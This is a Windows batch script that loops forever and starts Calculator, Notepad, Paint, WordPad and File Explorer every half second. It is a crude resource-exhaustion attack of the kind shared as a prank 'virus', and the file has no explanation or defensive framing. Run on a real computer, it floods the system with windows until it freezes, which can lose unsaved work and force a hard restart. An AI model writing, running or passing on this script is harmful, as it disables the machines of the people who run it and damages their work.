@echo off
:loop
start calc
start notepad
start mspaint
start write
start explorer
timeout /t 0.5 /nobreak >nul
goto loop
